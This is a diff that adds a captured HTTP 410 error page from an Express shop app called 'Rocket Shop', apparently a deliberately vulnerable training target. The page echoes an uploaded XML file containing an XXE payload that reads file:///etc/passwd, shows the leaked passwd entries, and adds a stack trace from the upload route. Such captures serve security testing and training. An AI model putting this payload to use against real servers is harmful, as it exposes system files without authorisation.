@@ -1,0 +1,61 @@
+HTTP/1.1 410 Gone
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Sat, 07 Dec 2024 14:45:28 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 4257
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&lt;data&gt;root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x... (test.xml)</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>Rocket Shop (Express ^4.17.1)</h1>
+      <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&lt;data&gt;root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x... (test.xml)</h2>
+      <ul id="stacktrace"><li> &nbsp; &nbsp;at handleXmlUpload (/app/routes/fileUpload.js:89:14)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at checkFileType (/app/routes/fileUpload.js:74:3)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at checkUploadSize (/app/routes/fileUpload.js:66:3)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at handleZipFileUpload (/app/routes/fileUpload.js:60:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at /app/routes/metrics.js:53:5</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at ensureFileIsPassed (/app/routes/fileUpload.js:27:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at Array.&lt;anonymous&gt; (/app/node_modules/multer/lib/make-middleware.js:53:37)</li><li> &nbsp; &nbsp;at listener (/app/node_modules/on-finished/index.js:169:15)</li><li> &nbsp; &nbsp;at onFinish (/app/node_modules/on-finished/index.js:100:5)</li><li> &nbsp; &nbsp;at callback (/app/node_modules/ee-first/index.js:55:10)</li><li> &nbsp; &nbsp;at IncomingMessage.onevent (/app/node_modules/ee-first/index.js:93:5)</li><li> &nbsp; &nbsp;at IncomingMessage.emit (events.js:314:20)</li><li> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1223:12)</li><li> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:84:21)</li></ul>
+    </div>
+  </body>
+</html>
